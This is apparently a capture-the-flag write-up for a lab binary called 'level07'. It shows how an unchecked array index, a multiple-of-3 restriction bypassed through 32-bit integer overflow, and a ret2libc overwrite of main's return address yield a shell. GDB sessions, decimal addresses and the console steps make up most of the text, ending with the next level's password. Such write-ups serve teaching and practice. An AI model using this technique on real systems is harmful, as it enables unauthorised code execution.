level07
=======
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level07/level07
```

*	We have the *level07* executable and here is the [code](src/level07.c)
* The program manages an array of 100 integers with three commands:
  - `store`: write a number at a given index.
  - `read`: read a number at a given index.
  - `quit`: exit the program.

* Looking at the code, we notice:
  - Neither `store` nor `read` checks whether the index is within the array bounds.
  - `store` refuses indexes that are multiples of 3.
  - Some number values are also forbidden.
  - The program clears its environment variables, making an environment-based shellcode less convenient.

* We can use this **out-of-bounds read/write** vulnerability to overwrite the return address of `main()` and perform ret2libc.

* First, let's retrieve the addresses:
  ```gdb
  (gdb) p system
  $1 = 0xf7e6aed0 <system>
  (gdb) p exit
  $2 = 0xf7e5eb70 <exit>
  (gdb) find &system,+9999999,"/bin/sh"
  0xf7f897ec
  ```

  The program accepts decimal numbers, so we convert the addresses:
  ```text
  system:  0xf7e6aed0 = 4159090384
  exit:    0xf7e5eb70 = 4159040368
  /bin/sh: 0xf7f897ec = 4160264172
  ```

* Now we need to find the index corresponding to the return address of `main()`. In GDB, while inspecting the `main` stack frame:
  ```gdb
  (gdb) break fgets
  (gdb) run
  (gdb) up
  (gdb) info frame
  Stack level 1, frame at 0xffffd300:
  eip = 0x8048729 in main
  saved eip = 0xf7e45513
  ```
  Note: We need to get to main before `info frame` because it would give us fgets saved eip.

  Converting the saved EIP:
  ```text
  0xf7e45513 = 4158936339
  ```

  We can use `read` to inspect memory beyond our 100-element array and look for this value:
  ```console
  Input command: read
  Index: 114
  Number at data[114] is 4158936339
  Completed read command successfully
  ```

  We found the return address of `main()` at **index 114**.

* Unfortunately, `114` is a multiple of 3, so we cannot write directly to it:
  ```console
  Input command: store
  Number: 1
  Index: 114
  *** ERROR! ***
  This index is reserved for wil!
  *** ERROR! ***
  Failed to do store command
  ```

* We can bypass this restriction using an **integer overflow**.

  Each array element is 4 bytes, so the program calculates its address using:
  ```c
  data + index * 4
  ```

  Since we're on a 32-bit system, this calculation wraps around after `2^32` bytes.

  We want to reach index 114, so we choose:
  ```text
  index = 2^30 + 114
        = 1073741938
  ```

  When multiplied by 4:
  ```text
  1073741938 * 4 = 4294967752

  4294967752 % 2^32 = 456
  114 * 4 = 456
  ```

  Both indexes therefore produce the same memory offset after overflow!

  However:
  ```text
  114 % 3 = 0             -> Forbidden
  1073741938 % 3 = 1      -> Allowed
  ```

* We can now overwrite the saved return address with `system()`:
  ```console
  Input command: store
  Number: 4159090384
  Index: 1073741938
  Completed store command successfully

  Input command: read
  Index: 114
  Number at data[114] is 4159090384
  Completed read command successfully
  ```

* Finally, we complete our ret2libc payload:
  ```text
  data[114] = system()       -> Return address of main
  data[115] = exit()         -> Return address of system
  data[116] = "/bin/sh"      -> Argument of system
  ```

  Indexes 115 and 116 are not multiples of 3, so we can write to them directly.

  ```console
  Input command: store
  Number: 4159040368
  Index: 115
  Completed store command successfully

  Input command: store
  Number: 4160264172
  Index: 116
  Completed store command successfully

  Input command: quit
  $ whoami
  level08
  $ cd ../level08
  $ cat .pass
  7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
  ```
